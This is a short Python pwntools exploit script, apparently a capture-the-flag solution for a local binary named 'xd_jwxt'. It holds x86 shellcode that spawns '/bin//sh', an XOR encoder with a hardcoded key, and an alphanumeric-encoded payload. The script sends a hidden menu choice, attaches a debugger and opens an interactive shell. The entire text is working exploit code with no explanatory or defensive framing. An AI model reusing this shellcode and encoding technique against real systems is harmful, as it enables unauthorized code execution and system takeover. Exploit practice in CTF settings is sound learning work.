from pwn import *

shellcode = (
             "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x21\x2c\x16\xcd\x80")
def encode(buf):
	i = 0
	key = 'BB2FA36AAA9541F0'
	out = ''
	while i<len(buf):
		if ord(buf[i])<= 0x2f or ord(buf[i])>0x7a:
			print "error"
			print i,buf[i]
			break
		a=ord(key[i&0xf])^ord(buf[i])
		i+=1
		out+=chr(a)
	return out
p =  process('./xd_jwxt')
p.recvuntil('choice:')
p.sendline('31337')
p.recvuntil('$ ')
gdb.attach(p,'b*0x080489BF\nc')
payload = 'hffffk4diFkTpj02Tpk0T0AuEE2O092w390k0Z0X7L0J0X137O080Y065N4o114C3m3H01'
payload += 'Bigtang'
p.sendline(encode(payload))
p.interactive()